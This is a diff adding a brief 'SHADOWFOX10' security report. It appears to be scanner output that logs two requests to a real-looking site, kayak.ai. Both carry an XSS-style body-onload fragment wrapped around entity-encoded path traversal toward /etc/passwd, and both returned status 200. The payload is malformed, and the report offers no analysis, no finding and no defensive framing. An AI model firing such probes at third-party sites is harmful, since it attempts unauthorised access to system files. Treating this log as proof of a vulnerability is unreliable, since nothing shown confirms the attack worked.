@@ -1,0 +1,9 @@
+=== SHADOWFOX10 :: SECURITY REPORT ===
+Target: kayak.ai?q=<body onload=&lt;div style='display:none'&gt;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;&lt;
+
+[STATUS]: 200
+[PAYLOAD]: <body onload=&lt;div style='display:none'&gt;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;&lt;/div&gt;>
+---
+[STATUS]: 200
+[PAYLOAD]: <body onload=&lt;div style='display:none'&gt;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#47;&#101;&#116;&#99;&#47;&#112;&#97;&#115;&#115;&#119;&#100;&lt;/div&gt;>
+---
